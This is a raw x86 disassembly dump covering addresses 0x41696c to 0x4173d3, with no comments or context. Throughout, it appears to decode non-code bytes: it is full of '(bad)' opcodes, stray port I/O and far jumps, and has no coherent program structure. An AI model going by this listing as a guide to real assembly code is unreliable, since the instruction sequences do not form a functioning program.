  41696c:	add    BYTE PTR [eax],al
  41696e:	sbb    dl,BYTE PTR [edx+edx*2]
  416971:	lahf   
  416972:	lods   eax,DWORD PTR ds:[esi]
  416973:	dec    ebp
  416974:	push   esi
  416975:	add    eax,0x274fa7f4
  41697a:	les    edi,FWORD PTR [edx]
  41697c:	rol    al,0x32
  41697f:	mov    dh,0x0
  416981:	add    ecx,esi
  416983:	stos   DWORD PTR es:[edi],eax
  416984:	sahf   
  416985:	xor    cl,BYTE PTR [edi-0x4c0195a2]
  41698b:	jns    0x4169f4
  41698d:	fist   DWORD PTR [ebx]
  41698f:	lock add DWORD PTR [edx+0x70],edx
  416993:	pusha  
  416994:	jp     0x4169b4
  416996:	in     eax,0xc5
  416998:	or     BYTE PTR [edx+0x3f603d2],dh
  41699e:	shl    al,1
  4169a0:	xlat   BYTE PTR ds:[ebx]
  4169a1:	add    eax,DWORD PTR [edi]
  4169a3:	or     dl,0x69
  4169a6:	mov    al,0x5f
  4169a8:	and    BYTE PTR [eax],cl
  4169aa:	xor    eax,0xc6e5fdc1
  4169af:	sbb    eax,0x33f6c673
  4169b4:	inc    ebp
  4169b5:	sahf   
  4169b6:	pop    esp
  4169b7:	in     al,0x31
  4169b9:	push   ecx
  4169ba:	outs   dx,BYTE PTR ds:[esi]
  4169bb:	lock xor al,0x32
  4169be:	jmp    0x41699d
  4169c0:	mov    bh,0xfc
  4169c2:	scas   ax,WORD PTR es:[edi]
  4169c4:	xchg   ecx,eax
  4169c5:	push   ebp
  4169c6:	outs   dx,BYTE PTR ds:[esi]
  4169c7:	ror    BYTE PTR [eax-0x923a698],cl
  4169cd:	xchg   BYTE PTR [edi+0x1606ccf2],bh
  4169d3:	jns    0x4169a9
  4169d5:	cmp    cl,BYTE PTR [edx]
  4169d7:	fistp  DWORD PTR [edx+0x16ad74e1]
  4169dd:	pop    edi
  4169de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169df:	data16 loope 0x4169f3
  4169e2:	mov    ch,0xcf
  4169e4:	in     al,0x75
  4169e6:	shl    DWORD PTR [esi],1
  4169e8:	xor    dl,BYTE PTR ds:0x4ae5e583
  4169ee:	jae    0x416a52
  4169f0:	pop    edi
  4169f1:	out    dx,al
  4169f2:	xchg   esi,eax
  4169f3:	mov    edi,0x87512b9
  4169f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4169f9:	jp     0x416a6d
  4169fb:	mov    bh,0x75
  4169fd:	jae    0x4169e2
  4169ff:	das    
  416a00:	(bad)  
  416a02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a04:	dec    esi
  416a05:	dec    eax
  416a06:	js     0x4169aa
  416a08:	fs jbe 0x4169f8
  416a0b:	jo     0x416a79
  416a0d:	add    DWORD PTR [edi+0x143d83ff],0x33
  416a14:	and    BYTE PTR [ebx+0x7e4d4664],dh
  416a1a:	jg     0x416a37
  416a1c:	cli    
  416a1d:	jb     0x4169c2
  416a1f:	or     DWORD PTR [ecx-0x2ebf29d5],eax
  416a25:	mov    bh,0x9c
  416a27:	test   BYTE PTR [esp+ebx*2],ah
  416a2a:	dec    edx
  416a2b:	xchg   edx,eax
  416a2c:	mov    eax,0xcda466fc
  416a31:	retf   
  416a32:	dec    ebp
  416a33:	push   esp
  416a34:	and    BYTE PTR [edi-0x64],bl
  416a37:	shl    BYTE PTR [esi+0x2d],0xd4
  416a3b:	and    ecx,0x40
  416a3e:	gs cld 
  416a40:	sbb    eax,0xee07513
  416a45:	adc    DWORD PTR ds:0x822e65a6,edx
  416a4b:	xchg   ebp,eax
  416a4c:	pop    esi
  416a4d:	xor    esp,0x9bfa8271
  416a53:	push   edi
  416a54:	push   ebx
  416a55:	in     al,dx
  416a56:	add    cl,BYTE PTR [esi+0x32]
  416a59:	sbb    al,0x1c
  416a5b:	add    bl,dl
  416a5d:	lea    eax,[eax]
  416a5f:	nop
  416a60:	test   al,0xdd
  416a62:	xchg   esi,eax
  416a63:	adc    DWORD PTR [esi],0xf7fef40b
  416a69:	push   ecx
  416a6a:	dec    edx
  416a6b:	or     eax,DWORD PTR [esi]
  416a6d:	add    al,BYTE PTR [eax]
	...
  416ad3:	add    BYTE PTR [eax],al
  416ad5:	add    bl,cl
  416ad7:	pusha  
  416ad8:	ror    BYTE PTR [ebx+0x60dbbbfb],1
  416ade:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416adf:	mov    al,ds:0xc8ea0ba3
  416ae4:	xor    al,0x39
  416ae6:	addr16 hlt 
  416ae8:	add    BYTE PTR [eax],al
  416aea:	add    BYTE PTR [ecx],al
  416aec:	add    BYTE PTR [eax],al
  416aee:	repz js 0x416b04
  416af1:	call   0xfe79:0xbe17e583
  416af8:	and    DWORD PTR [ebx],eax
  416afa:	cmp    eax,0xf431d700
  416aff:	push   0xcb6a05b0
  416b04:	stc    
  416b05:	mov    dh,0xcf
  416b07:	mov    eax,ds:0x747049d1
  416b0c:	mov    DWORD PTR [ebp-0x2f57723c],edi
  416b12:	adc    al,0x38
  416b14:	cmp    ecx,DWORD PTR [edx-0x27]
  416b17:	dec    eax
  416b18:	(bad)  
  416b19:	mov    eax,DWORD PTR [esi+0x4a]
  416b1c:	mov    bh,0xa2
  416b1e:	lea    ebp,[ecx-0x6855c032]
  416b24:	stc    
  416b25:	jecxz  0x416ac6
  416b27:	js     0x416ad5
  416b29:	leave  
  416b2a:	jg     0x416b99
  416b2c:	(bad)
  416b30:	test   DWORD PTR [edi+edi*8],0xfc43f126
  416b37:	inc    eax
  416b38:	cmp    dl,dh
  416b3a:	and    al,0x5d
  416b3c:	sti    
  416b3d:	jl     0x416b4b
  416b3f:	rcr    DWORD PTR [eax],1
  416b41:	out    dx,al
  416b42:	stos   BYTE PTR es:[edi],al
  416b43:	gs out dx,eax
  416b45:	and    al,0x5e
  416b47:	inc    ebx
  416b48:	jns    0x416ace
  416b4a:	faddp  st(4),st
  416b4c:	sbb    DWORD PTR [edi+0x46209932],edi
  416b52:	adc    eax,0x525f420f
  416b57:	inc    ebx
  416b58:	dec    esi
  416b59:	test   eax,0x5d86c0ba
  416b5e:	xor    cl,ah
  416b60:	xchg   esi,eax
  416b61:	jo     0x416bd2
  416b63:	cmc    
  416b64:	out    0xe0,eax
  416b66:	ror    DWORD PTR [esi],cl
  416b68:	mov    ds:0x347f2555,al
  416b6d:	inc    esi
  416b6e:	pop    ebx
  416b6f:	inc    esi
  416b70:	not    esi
  416b72:	ror    DWORD PTR [eax-0x7655a358],cl
  416b78:	mov    ds:0x5620549e,eax
  416b7d:	lock xor BYTE PTR [ebp+0x332c26a7],al
  416b84:	ja     0x416bc0
  416b86:	imul   ebx,DWORD PTR [edi-0x4e],0x33
  416b8a:	fwait
  416b8b:	std    
  416b8c:	test   edx,esp
  416b8e:	test   dl,bh
  416b90:	sbb    ah,BYTE PTR [edx-0x335331c4]
  416b96:	push   es
  416b97:	(bad)  
  416b98:	imul   BYTE PTR [eax*8-0x6780e22e]
  416b9f:	scas   al,BYTE PTR es:[edi]
  416ba0:	xchg   esp,eax
  416ba1:	pusha  
  416ba2:	xor    al,0x1c
  416ba4:	leave  
  416ba5:	mov    eax,0x11d9e6f5
  416baa:	ja     0x416be3
  416bac:	mov    DWORD PTR [ebx],ebp
  416bae:	je     0x416b32
  416bb0:	ror    al,cl
  416bb2:	int3   
  416bb3:	nop
  416bb4:	fild   WORD PTR [edx+0x17]
  416bb7:	(bad)  
  416bb8:	loop   0x416b89
  416bba:	out    dx,eax
  416bbb:	aam    0x35
  416bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416bbe:	(bad)  
  416bbf:	adc    esp,DWORD PTR [eax-0x61]
  416bc2:	js     0x416b7b
  416bc4:	fwait
  416bc5:	std    
  416bc6:	sti    
  416bc7:	pop    ecx
  416bc8:	test   DWORD PTR [ebx],esi
  416bca:	push   ss
  416bcb:	xor    eax,0xed0ddc8c
  416bd0:	(bad)  
  416bd2:	fcmovu st,st(7)
  416bd4:	push   0x6e
  416bd6:	mov    BYTE PTR [ebp+0x10],cl
  416bd9:	fiadd  DWORD PTR [edx+0x8]
  416bdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416bdd:	ret    
  416bde:	sub    edi,DWORD PTR [ebx-0x34]
  416be1:	test   edx,ebx
  416be3:	nop
  416be4:	inc    edi
  416be5:	cmp    esi,DWORD PTR [ecx+0x352d5546]
  416beb:	sar    DWORD PTR [edi],0x68
	...
  416c56:	jecxz  0x416cbd
  416c58:	push   cs
  416c59:	test   DWORD PTR [esi-0x38a0401],0xa05b70a9
  416c63:	push   0x38
  416c65:	jge    0x416cce
  416c67:	cmc    
  416c68:	add    BYTE PTR [eax],al
  416c6a:	add    BYTE PTR [ecx],al
  416c6c:	add    BYTE PTR [eax],al
  416c6e:	xor    al,0x24
  416c70:	frstor [ecx+0x3541d5fb]
  416c76:	dec    eax
  416c77:	push   ebx
  416c78:	dec    eax
  416c79:	int3   
  416c7a:	mov    ah,BYTE PTR [edi-0x7978010f]
  416c80:	lock icebp 
  416c82:	leave  
  416c83:	lock mov gs,edx
  416c86:	xchg   edx,eax
  416c87:	dec    eax
  416c88:	scas   al,BYTE PTR es:[edi]
  416c89:	jecxz  0x416cd8
  416c8b:	(bad)  
  416c8c:	pop    esp
  416c8d:	enter  0xfaec,0xc7
  416c91:	mov    edi,0xb02c8f12
  416c96:	sbb    eax,0x178c71c9
  416c9b:	xchg   DWORD PTR [ebp+edi*4-0x13e4302],ecx
  416ca2:	push   ebp
  416ca3:	jbe    0x416cd8
  416ca5:	ds inc esi
  416ca7:	in     al,0x3a
  416ca9:	fst    QWORD PTR [edx-0x6e601baa]
  416caf:	and    DWORD PTR [esi+0x50],0x91bce740
  416cb6:	fistp  QWORD PTR [ecx+0x75]
  416cb9:	cwde   
  416cba:	push   edx
  416cbb:	ins    DWORD PTR es:[edi],dx
  416cbc:	mov    bl,BYTE PTR [ecx+0x65]
  416cbf:	fstp   QWORD PTR [eax+0x70]
  416cc2:	in     ax,0x7d
  416cc5:	pop    ebp
  416cc6:	(bad)  
  416cc7:	ins    BYTE PTR es:[edi],dx
  416cc8:	mov    al,0x6c
  416cca:	aam    0x4
  416ccc:	pushf  
  416ccd:	popa   
  416cce:	jnp    0x416ca4
  416cd0:	jne    0x416cee
  416cd2:	jno    0x416d2e
  416cd4:	shl    DWORD PTR [edx+ecx*8-0x10],0x44
  416cd9:	inc    esi
  416cda:	dec    edi
  416cdb:	add    DWORD PTR [ebp-0x35],eax
  416cde:	jnp    0x416d5c
  416ce0:	popa   
  416ce1:	sub    eax,eax
  416ce3:	stos   DWORD PTR es:[edi],eax
  416ce4:	dec    esi
  416ce5:	inc    eax
  416ce6:	push   ebx
  416ce7:	sub    cl,cl
  416ce9:	dec    eax
  416cea:	xor    al,0x26
  416cec:	push   edi
  416ced:	sub    esp,DWORD PTR [esi+ebx*8+0x4c20cd7a]
  416cf4:	mov    dh,0x77
  416cf6:	mov    ah,0x54
  416cf8:	push   ebp
  416cf9:	pop    ds
  416cfa:	jmp    0x8591:0x583b75db
  416d01:	and    al,0x6a
  416d03:	jno    0x416d64
  416d05:	sahf   
  416d06:	idiv   BYTE PTR [ebp-0x686d6dea]
  416d0c:	call   0xdd796580
  416d11:	jne    0x416d34
  416d13:	out    dx,al
  416d14:	(bad)  
  416d15:	sbb    al,BYTE PTR [ebx]
  416d17:	sbb    DWORD PTR [edx+edi*8+0xa],0x62
  416d1c:	xlat   BYTE PTR ds:[ebx]
  416d1d:	jle    0x416d10
  416d1f:	dec    eax
  416d20:	mov    ds:0xa648e8c3,eax
  416d25:	and    eax,0x933c815e
  416d2a:	jae    0x416d7d
  416d2c:	push   esi
  416d2d:	ja     0x416d93
  416d2f:	push   ecx
  416d30:	mov    ebx,0xc51e6eff
  416d35:	mov    edi,DWORD PTR [eax-0x58]
  416d38:	hlt    
  416d39:	dec    ecx
  416d3a:	in     al,dx
  416d3b:	jnp    0x416cdb
  416d3d:	push   cs
  416d3e:	repnz (bad) 
  416d40:	in     eax,dx
  416d41:	add    al,0x11
  416d43:	sub    eax,0x1c283d90
  416d48:	sbb    al,0xc
  416d4a:	push   edx
  416d4b:	dec    edx
  416d4c:	add    bh,ah
  416d4e:	lahf   
  416d4f:	sbb    BYTE PTR ds:0x98883c1e,ah
  416d55:	adc    eax,0xc32de5c9
  416d5a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  416d5c:	jo     0x416d5f
  416d5e:	popf   
  416d5f:	pop    ecx
  416d60:	or     eax,0x3f0f1d4c
  416d65:	push   edi
  416d66:	xor    bl,BYTE PTR [eax-0x2c]
  416d69:	fcmovne st,st(6)
  416d6b:	jns    0x416cfc
  416d6d:	sbb    al,BYTE PTR [eax]
	...
  416dd3:	add    BYTE PTR [eax],al
  416dd5:	add    BYTE PTR [ecx],ah
  416dd7:	xchg   ebx,eax
  416dd8:	mov    DWORD PTR [edi-0x60d84045],ebp
  416dde:	mov    ch,0x99
  416de0:	pop    edx
  416de1:	das    
  416de2:	icebp  
  416de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416de4:	cld    
  416de5:	pop    ecx
  416de6:	test   BYTE PTR [bx+si],0x0
  416dea:	add    BYTE PTR [ecx],al
  416dec:	add    BYTE PTR [eax],al
  416dee:	dec    esi
  416def:	aaa    
  416df0:	retf   
  416df1:	jnp    0x416d88
  416df3:	fld    DWORD PTR [eax+0x111b25b5]
  416df9:	mov    ah,0xc3
  416dfb:	imul   esi,DWORD PTR [ecx+0x410abf1d],0x3a52a80f
  416e05:	lods   eax,DWORD PTR ds:[esi]
  416e06:	jo     0x416e2d
  416e08:	dec    eax
  416e09:	scas   al,BYTE PTR es:[edi]
  416e0a:	jo     0x416e16
  416e0c:	mov    al,ds:0xc559078d
  416e11:	idiv   BYTE PTR [edx+eax*2+0x75278bc2]
  416e18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e19:	and    esi,DWORD PTR [ecx]
  416e1b:	sub    ah,cl
  416e1d:	or     al,0x1a
  416e1f:	sahf   
  416e20:	jle    0x416e1d
  416e22:	ja     0x416e8f
  416e24:	push   0x49
  416e26:	push   0x64
  416e28:	push   eax
  416e29:	into   
  416e2a:	pop    edi
  416e2b:	fwait
  416e2c:	dec    edx
  416e2d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e2e:	sbb    eax,0xe10615f4
  416e33:	mov    bl,BYTE PTR [ebp+0x30]
  416e36:	cmp    eax,0x9220bb25
  416e3b:	mov    WORD PTR [esi-0x286e5e90],ds
  416e41:	(bad)  
  416e42:	shr    DWORD PTR [ebx-0x13939173],cl
  416e48:	xchg   ebp,eax
  416e49:	out    dx,al
  416e4a:	pop    esi
  416e4b:	jge    0x416e7e
  416e4d:	cli    
  416e4e:	imul   esp,edx,0x4ddf52b5
  416e54:	push   0x3c2dfc6
  416e59:	pop    edi
  416e5a:	in     eax,dx
  416e5b:	jno    0x416e5e
  416e5d:	shl    DWORD PTR [edi+0x4b],1
  416e60:	pop    ds
  416e61:	jge    0x416ea2
  416e63:	retf   
  416e64:	xchg   esp,eax
  416e65:	mov    dl,0xc5
  416e67:	xchg   edx,eax
  416e68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e69:	ror    BYTE PTR [ebp+ebp*4-0x3d04d6f8],1
  416e70:	retf   
  416e71:	(bad)  
  416e72:	nop
  416e73:	(bad)
  416e78:	pop    eax
  416e79:	xchg   ebx,eax
  416e7a:	int3   
  416e7b:	mov    ebx,0x6f88523c
  416e80:	vrsqrtss xmm5,xmm0,DWORD PTR [ebx-0x69]
  416e85:	pop    ecx
  416e86:	hlt    
  416e87:	mov    edi,0x66992f78
  416e8c:	ins    DWORD PTR es:[edi],dx
  416e8d:	sbb    al,bh
  416e8f:	push   0xffffff87
  416e91:	jge    0x416ed0
  416e93:	xor    eax,0x20cc20a0
  416e98:	scas   al,BYTE PTR es:[edi]
  416e99:	fstp   TBYTE PTR [ecx]
  416e9b:	mul    eax
  416e9d:	push   ebp
  416e9e:	xlat   BYTE PTR ds:[ebx]
  416e9f:	stc    
  416ea0:	and    BYTE PTR [ebx-0x275908a2],dl
  416ea6:	mov    eax,0x45aab8bc
  416eab:	jne    0x416f15
  416ead:	jmp    0x5145:0x51ed7b50
  416eb4:	retf   
  416eb5:	pop    edi
  416eb6:	jno    0x416e6f
  416eb8:	cmp    BYTE PTR [ebx],al
  416eba:	cmp    DWORD PTR [edi+0x292fd749],esi
  416ec0:	aaa    
  416ec1:	iret   
  416ec2:	iret   
  416ec3:	mov    ah,0x45
  416ec5:	pop    edx
  416ec6:	neg    BYTE PTR [edx-0x48]
  416ec9:	jb     0x416e82
  416ecb:	dec    esi
  416ecc:	fcomp  DWORD PTR [edx-0x5afd280c]
  416ed2:	adc    al,0x25
  416ed4:	rol    DWORD PTR [edx+eiz*1-0x77],0xac
  416ed9:	adc    eax,0xe5fb6000
  416ede:	ins    DWORD PTR es:[edi],dx
  416edf:	mov    ebx,0x337e2186
  416ee4:	int    0xbd
  416ee6:	mov    ebx,0xc114138e
  416eeb:	sbb    BYTE PTR [ebx],0xb
	...
  416f56:	mov    edi,0xae6d8e19
  416f5b:	(bad)  
  416f5c:	(bad)  
  416f5d:	fucomi st,st(0)
  416f5f:	xor    eax,0x8b08eea
  416f64:	jns    0x416fb6
  416f66:	test   DWORD PTR [bx+si],0x10000
  416f6d:	add    BYTE PTR [edi+ebx*4],dl
  416f70:	jbe    0x416fbf
  416f72:	xchg   edx,eax
  416f73:	xor    al,0xea
  416f75:	out    0xcd,al
  416f77:	inc    ebp
  416f78:	mov    al,ds:0x438827e3
  416f7d:	fwait
  416f7e:	inc    edi
  416f7f:	hlt    
  416f80:	enter  0xd824,0x3
  416f84:	std    
  416f85:	fistp  WORD PTR [edi+eax*2+0x49]
  416f89:	mov    WORD PTR [ebp+0x78936662],?
  416f8f:	sub    eax,DWORD PTR [edi-0x11]
  416f92:	shl    bl,1
  416f94:	or     eax,0xeb51f515
  416f99:	ffree  st(4)
  416f9b:	sbb    al,0xf4
  416f9d:	and    edx,DWORD PTR [edx-0x17]
  416fa0:	lahf   
  416fa1:	and    edi,DWORD PTR [eax]
  416fa3:	sbb    al,0x80
  416fa5:	es mov ebx,0x816db0ad
  416fab:	xor    BYTE PTR [edi-0xd],cl
  416fae:	lea    edi,[ebx]
  416fb0:	retf   0x914
  416fb3:	ffree  st(6)
  416fb5:	dec    edx
  416fb6:	pop    esp
  416fb7:	iret   
  416fb8:	pop    eax
  416fb9:	jp     0x416fb7
  416fbb:	fist   DWORD PTR [ebx-0x57]
  416fbe:	inc    esi
  416fbf:	inc    edx
  416fc0:	sub    al,0xc8
  416fc2:	sub    eax,edi
  416fc4:	mov    ch,bl
  416fc6:	push   ecx
  416fc7:	std    
  416fc8:	adc    eax,0xf804ac82
  416fcd:	push   0xc
  416fcf:	test   eax,0x232ab14e
  416fd4:	inc    edi
  416fd5:	ja     0x416f6e
  416fd7:	imul   ebx,DWORD PTR [edi],0x4c
  416fda:	and    edx,esi
  416fdc:	mov    al,ds:0x9e5cb9fd
  416fe1:	je     0x417020
  416fe3:	pusha  
  416fe4:	nop
  416fe5:	jbe    0x417031
  416fe7:	clc    
  416fe8:	add    ecx,ebp
  416fea:	jecxz  0x416f75
  416fec:	mov    cs,WORD PTR [ebx-0x8]
  416fef:	clc    
  416ff0:	loope  0x416f94
  416ff2:	(bad)  
  416ff3:	sub    cl,BYTE PTR [edx+0x49e9965b]
  416ff9:	test   DWORD PTR [edi+0x17],ecx
  416ffc:	test   bl,bh
  416ffe:	fld    QWORD PTR [edi-0x57]
  417001:	and    dh,BYTE PTR [edi]
  417003:	xor    eax,0xac8540d6
  417008:	pop    ebx
  417009:	std    
  41700a:	out    dx,eax
  41700b:	not    DWORD PTR [ebx]
  41700d:	shl    DWORD PTR [ebp+esi*4+0x30],0xf8
  417012:	daa    
  417013:	mov    ebp,0xf806e801
  417018:	add    edi,DWORD PTR [edx-0x73]
  41701b:	clc    
  41701c:	sbb    esp,DWORD PTR [ebp-0x49]
  41701f:	shrd   DWORD PTR [ebp-0x3d],ebp,0x62
  417024:	(bad)  
  417025:	popf   
  417026:	add    esp,esp
  417028:	bound  esi,QWORD PTR [ebp-0x1c264b07]
  41702e:	ret    
  41702f:	(bad)  
  417031:	adc    esi,DWORD PTR [ebx+0x29]
  417034:	cmc    
  417035:	sbb    DWORD PTR [edx+0xe],edx
  417038:	mov    dl,0x93
  41703a:	cmc    
  41703b:	push   edi
  41703c:	add    ecx,DWORD PTR [ebx+0x6c]
  41703f:	in     al,0xfb
  417041:	int3   
  417042:	shl    DWORD PTR [eax-0x34aad633],cl
  417048:	mov    ecx,0x849b3b64
  41704d:	pusha  
  41704e:	inc    ecx
  41704f:	add    ecx,edx
  417051:	stc    
  417052:	iret   
  417053:	adc    al,0xb4
  417055:	(bad)
  417058:	sti    
  417059:	pop    ss
  41705a:	lahf   
  41705b:	mov    ds:0x8e223d13,eax
  417060:	dec    esp
  417061:	and    eax,0x6f426df2
  417066:	mov    esp,0xee04e93e
  41706b:	test   BYTE PTR [ecx+eiz*2],al
	...
  4170d6:	jbe    0x417105
  4170d8:	push   ebp
  4170d9:	inc    ecx
  4170da:	pop    edi
  4170db:	jns    0x417153
  4170dd:	aas    
  4170de:	(bad)  
  4170df:	loopne 0x4170d5
  4170e1:	sub    ebx,DWORD PTR [ecx-0x63]
  4170e4:	push   edi
  4170e5:	xor    ah,BYTE PTR [edi-0x8]
  4170e8:	add    BYTE PTR [eax],al
  4170ea:	add    BYTE PTR [ecx],al
  4170ec:	add    BYTE PTR [eax],al
  4170ee:	ss popf 
  4170f0:	enter  0xe4cc,0x78
  4170f4:	outs   dx,DWORD PTR ds:[esi]
  4170f5:	cli    
  4170f6:	xor    BYTE PTR [esi],dh
  4170f8:	lods   al,BYTE PTR ds:[esi]
  4170f9:	pop    ds
  4170fa:	jl     0x41711b
  4170fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4170fd:	aas    
  4170fe:	mov    ebp,0x769fdeb
  417103:	out    dx,eax
  417104:	xchg   BYTE PTR [edi+0x512ba44c],dh
  41710a:	adc    DWORD PTR [edi+0x2b90f9e0],ebp
  417110:	lahf   
  417111:	jb     0x4170d8
  417113:	scas   al,BYTE PTR es:[edi]
  417114:	addr16 and al,0x1d
  417117:	popa   
  417118:	loopne 0x4170aa
  41711a:	pop    esi
  41711b:	push   ebx
  41711c:	or     al,0xbd
  41711e:	xlat   BYTE PTR ds:[ebx]
  41711f:	push   ebp
  417120:	inc    edx
  417121:	xor    al,0xcc
  417123:	add    eax,0x7c974dbc
  417128:	add    ebp,DWORD PTR [edx+0xcfa39ef]
  41712e:	ret    0x3e51
  417131:	and    eax,0x1601b5a5
  417136:	pop    ds
  417137:	call   0xcce449a0
  41713c:	dec    esi
  41713d:	retf   
  41713e:	je     0x4171af
  417140:	inc    edi
  417141:	outs   dx,BYTE PTR ds:[esi]
  417142:	js     0x417117
  417144:	out    0xeb,al
  417146:	sub    eax,0x8e6ca936
  41714b:	jmp    0xbc64d6c6
  417150:	cmp    bh,BYTE PTR [ebx-0xb]
  417153:	mov    ebp,0xca7fb303
  417158:	sar    DWORD PTR [bx+di+0x2be8],0x23
  41715e:	or     eax,0x7c7c896a
  417163:	inc    DWORD PTR [ebp-0x6e6bc3c]
  417169:	or     dh,0xf3
  41716c:	sub    ah,BYTE PTR [edx+0xd3a6cc2]
  417172:	sti    
  417173:	push   cs
  417174:	shl    DWORD PTR [ecx],1
  417176:	stc    
  417177:	lods   al,BYTE PTR ds:[esi]
  417178:	out    0xcd,eax
  41717a:	outs   dx,BYTE PTR ds:[esi]
  41717b:	and    BYTE PTR [ecx+0x19161c8c],0x2e
  417182:	ror    DWORD PTR [esi+0x1c9cbaea],cl
  417188:	xchg   BYTE PTR [edx-0x33],dh
  41718b:	push   eax
  41718c:	jb     0x417142
  41718e:	inc    edi
  41718f:	inc    esp
  417190:	(bad)  
  417191:	iret   
  417192:	ret    
  417193:	cmp    al,0xc6
  417195:	pop    ecx
  417196:	iret   
  417197:	js     0x417198
  417199:	mov    DWORD PTR [edx],edx
  41719b:	add    esi,DWORD PTR [edi-0x628e5b93]
  4171a1:	mov    eax,0xead28f68
  4171a6:	(bad)  
  4171a7:	sar    DWORD PTR [ebx+0x4b],1
  4171aa:	ret    
  4171ab:	dec    edi
  4171ac:	sbb    bh,BYTE PTR [ebx+esi*4-0x5af8c72a]
  4171b3:	pusha  
  4171b4:	mov    ds:0xa2e46cd8,al
  4171b9:	aam    0xf8
  4171bb:	(bad)  
  4171bd:	sub    eax,0xe4b22924
  4171c2:	sbb    BYTE PTR [ebp+0x6f308162],al
  4171c8:	leave  
  4171c9:	jl     0x41717a
  4171cb:	(bad)  
  4171cc:	arpl   dx,sp
  4171ce:	mov    ds:0x5d4889e1,eax
  4171d3:	sub    DWORD PTR [ecx],ebp
  4171d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4171d6:	jnp    0x4171ab
  4171d8:	xchg   DWORD PTR [ecx],edi
  4171da:	packssdw mm2,mm0
  4171dd:	sbb    al,0x42
  4171df:	xchg   DWORD PTR [ebx+0x7c2ee33c],esi
  4171e5:	push   eax
  4171e6:	jg     0x417230
  4171e8:	jmp    0xe6:0x80facc80
	...
  417253:	add    BYTE PTR [eax],al
  417255:	add    BYTE PTR [esi-0xe58fe7],ah
  41725b:	jnp    0x41724b
  41725d:	mov    ebp,0x986526a4
  417262:	out    0x32,eax
  417264:	mov    ds:0xf96794,eax
  417269:	add    BYTE PTR [eax],al
  41726b:	add    DWORD PTR [eax],eax
  41726d:	add    cl,cl
  41726f:	and    eax,0xfce75efa
  417274:	xor    eax,0x9c868ecc
  417279:	pop    ecx
  41727a:	inc    ecx
  41727b:	repnz sub ebp,DWORD PTR [edi]
  41727e:	scas   al,BYTE PTR es:[edi]
  41727f:	dec    ecx
  417280:	inc    ebx
  417281:	inc    edi
  417282:	push   0x19
  417284:	into   
  417285:	(bad)  
  417286:	xor    DWORD PTR [esi-0x3b],ebp
  417289:	hlt    
  41728a:	ins    BYTE PTR es:[edi],dx
  41728b:	and    ebp,edx
  41728d:	inc    ecx
  41728e:	and    BYTE PTR [esi-0x75],cl
  417291:	jle    0x4172f7
  417293:	or     ebx,DWORD PTR [eax+0x27]
  417296:	xchg   esi,eax
  417297:	sbb    BYTE PTR [esi],0x97
  41729a:	adc    al,0xeb
  41729c:	icebp  
  41729d:	imul   ebx,DWORD PTR [eax-0x4429061b],0x7d3e1a3d
  4172a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172a8:	pop    esi
  4172a9:	dec    esi
  4172aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172ab:	and    al,BYTE PTR [eax+0x3e956cb8]
  4172b1:	fs inc ebp
  4172b3:	xchg   ecx,eax
  4172b4:	xor    DWORD PTR [edx],ebp
  4172b6:	sar    DWORD PTR [eax+0x3],cl
  4172b9:	lahf   
  4172ba:	pop    DWORD PTR [esp+esi*8-0x26]
  4172be:	test   bh,ah
  4172c0:	and    ecx,DWORD PTR [edx+0xc622935]
  4172c6:	jmp    0x417256
  4172c8:	pmulhw mm3,QWORD PTR [esi+edx*4-0x54054cdc]
  4172d0:	aam    0x6
  4172d2:	loop   0x4172a1
  4172d4:	imul   ecx,ebp,0xe83e5574
  4172da:	sub    DWORD PTR [edx+ecx*8+0xf],0x929841d1
  4172e2:	bound  esi,QWORD PTR [eax+0x47a838e5]
  4172e8:	mov    ds:0x1c0bd0cf,al
  4172ed:	add    DWORD PTR [esi-0x5d],0x599d2871
  4172f4:	std    
  4172f5:	fwait
  4172f6:	icebp  
  4172f7:	shl    esp,1
  4172f9:	gs test ebx,ebp
  4172fc:	cdq    
  4172fd:	xchg   esp,eax
  4172fe:	add    edi,DWORD PTR [ebx+0x1ecbdebb]
  417304:	inc    eax
  417305:	mov    dh,0xf7
  417307:	out    0x1f,al
  417309:	dec    edi
  41730a:	jo     0x4172c4
  41730c:	div    BYTE PTR [eax-0x1118a61b]
  417312:	adc    BYTE PTR [eax+0x77],cl
  417315:	or     BYTE PTR [edx-0x32],cl
  417318:	mov    ds,WORD PTR [ecx]
  41731a:	xchg   ebp,eax
  41731b:	inc    eax
  41731c:	popa   
  41731d:	arpl   sp,ax
  41731f:	inc    esi
  417320:	cli    
  417321:	and    ah,BYTE PTR [eax-0x62]
  417324:	fbstp  TBYTE PTR [ebx-0x54]
  417327:	dec    edi
  417328:	icebp  
  417329:	adc    BYTE PTR [esi],ah
  41732b:	add    BYTE PTR [edi-0x80b1e51],0xbe
  417332:	test   DWORD PTR [ebx-0x32],ecx
  417335:	jne    0x4172e0
  417337:	sbb    cl,BYTE PTR [edx]
  417339:	dec    ebx
  41733a:	mov    ebp,0x4b078f32
  41733f:	(bad)  
  417340:	dec    ecx
  417341:	mov    esp,0xde4eac26
  417346:	cmp    esi,edi
  417348:	ins    DWORD PTR es:[edi],dx
  417349:	mov    ds,WORD PTR [edx-0x11ae1a4]
  41734f:	pop    ecx
  417350:	pusha  
  417351:	jnp    0x4173cd
  417353:	pop    ss
  417354:	add    al,0x24
  417356:	xor    ecx,0x62c9ce5e
  41735c:	dec    esi
  41735d:	adc    BYTE PTR [ecx],0x54
  417360:	add    eax,0x9bef0acd
  417365:	fistp  DWORD PTR ds:0x5d2a5f33
  41736b:	sti    
  41736c:	pop    edi
  41736d:	fiadd  WORD PTR [eax]
	...
  4173d3:	add    BYTE PTR [eax],al
